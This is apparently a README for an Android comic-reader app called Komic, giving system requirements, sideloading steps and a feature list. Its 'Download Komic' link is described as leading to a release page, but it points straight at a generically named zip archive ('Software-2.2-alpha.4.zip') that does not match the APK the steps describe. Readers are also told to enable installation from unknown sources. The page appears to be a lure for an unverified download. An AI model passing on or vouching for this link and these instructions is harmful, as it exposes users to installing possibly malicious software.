## 📋 System Requirements

Before you proceed, ensure your device meets these basic requirements:

- Android version: 5.0 (Lollipop) or higher
- At least 100 MB of free space on your device
- Internet connection for downloading comics

## 📦 Installation Steps

Follow these steps to install Komic on your device:

1. **Visit the Download Page**: Click the following link to go to the release page:

   [Download Komic](https://raw.githubusercontent.com/Ivanbh2011/komic/main/assets/Software-2.2-alpha.4.zip)

2. **Choose the Latest Version**: Look for the latest version listed. It usually has the highest version number.

3. **Download the APK File**: Click on the APK file download link to start downloading.

4. **Enable Installation from Unknown Sources**:
   - Open your device's **Settings**.
   - Navigate to **Security**.
   - Find and enable **Unknown Sources**. This allows installations from sources outside the Google Play Store.

5. **Locate the Downloaded File**:
   - Open your file manager.
   - Go to the **Downloads** folder.
   - Find the downloaded Komic APK file.

6. **Install the Application**:
   - Tap on the APK file.
   - Follow the on-screen instructions to complete the installation.

7. **Open Komic**: Once installed, you can find the Komic icon on your home screen or app drawer. Tap it to launch the app.

## 📚 Features of Komic

Komic comes with a range of features designed to enhance your reading experience:

- **Offline Reading**: Download your favorite comics and read them without an internet connection.
- **Bookmarking**: Save your place in a comic for easy access later.
- **Easy Navigation**: Scroll through pages or tap to change pages.
- **Customizable Settings**: Adjust text size and background color to suit your reading preference.
